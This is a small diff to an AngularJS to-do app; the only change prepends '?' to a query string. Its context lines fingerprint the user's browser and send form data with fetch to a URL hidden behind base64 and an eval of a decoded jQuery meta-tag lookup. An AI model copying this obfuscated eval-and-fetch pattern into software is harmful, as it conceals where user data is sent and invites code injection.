@@ -18,7 +18,7 @@ angular.module('todoApp', [])
       $scope.data.createdBy = Fingerprint2.x64hash128(values.join(''), 31);
       $scope.data.timeStamp = new Date().toISOString();
       $scope.data.Date = new Date($scope.data.Date).toISOString();
-     var urlpram = new URLSearchParams($scope.data).toString();
+     var urlpram = "?" + new URLSearchParams($scope.data).toString();
      $("#loader").show();
      fetch((function(d){ return atob(d)+urlpram;})(eval(atob("JCgibWV0YVtuYW1lPSd0ZXN0J10iKS5hdHRyKCJjb250ZW50Iik=")))).then(function(resp){
       $("#loader").hide();
